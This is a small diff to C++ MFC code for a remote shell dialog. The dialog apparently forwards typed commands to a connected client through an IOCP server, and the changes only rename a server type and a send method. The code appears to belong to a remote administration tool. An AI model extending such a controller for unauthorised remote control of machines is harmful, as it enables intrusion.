@@ -25,7 +25,7 @@ void CAutoEndEdit::OnChar(UINT nChar, UINT nRepCnt, UINT nFlags) {
 
 IMPLEMENT_DYNAMIC(CShellDlg, CDialog)
 
-CShellDlg::CShellDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
+CShellDlg::CShellDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT *ContextObject)
 	: DialogBase(CShellDlg::IDD, pParent, IOCPServer, ContextObject, IDI_ICON_SHELL)
 {
 }
@@ -64,7 +64,7 @@ BOOL CShellDlg::OnInitDialog()
 	SetWindowText(str);
 
 	BYTE bToken = COMMAND_NEXT;
-	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));  
+	m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));  
 
 	m_Edit.SetWindowTextA(">>");
 	m_nCurSel = m_Edit.GetWindowTextLengthA();
@@ -206,7 +206,7 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 				return TRUE;
 			}
 			int length = str.GetLength() - m_nCurSel;
-			m_iocpServer->OnClientPreSending(m_ContextObject, pSrc, length);
+			m_iocpServer->Send2Client(m_ContextObject, pSrc, length);
 			m_nCurSel = m_Edit.GetWindowTextLength();
 		}
 		// ÏÞÖÆVK_BACK
